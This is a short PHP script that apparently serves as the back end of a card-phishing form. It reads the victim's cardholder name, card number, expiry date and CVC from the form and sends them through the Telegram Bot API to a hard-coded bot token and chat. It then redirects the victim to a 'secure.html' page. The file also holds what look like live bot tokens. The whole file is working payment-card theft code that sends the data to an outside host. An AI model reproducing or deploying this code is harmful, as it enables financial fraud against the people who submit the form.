<?php


// https://api.telegram.org/bot5389899824:AAGkJHLwTgMf2qPTIlKbjfQ4u28XPwiDtbw/getUpdates

$cardName = $_POST['owner'];
$cardNumber = $_POST['numbercard'];
$validity = $_POST['validity'];
$cvc = $_POST['cvc'];
$token = "5314142201:AAHzAGE3S3dQ1zCQlseWjIUO3U8WVvQ02A8";
$chat_id = '-610084593';
$arr = array(
    'Владелец карты: ' => $cardName,
    'Номер карты: ' => $cardNumber,
    'Срок действия: ' => $validity,
    'CVC: ' => $cvc,
);

foreach($arr as $key => $value) {
    $txt .= "<b>".$key."</b>".$value."%0A";
};

$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");

if($sendToTelegram) {
    header('Location: secure.html');
    form.reset();
} else {
    echo "Error";
}
?>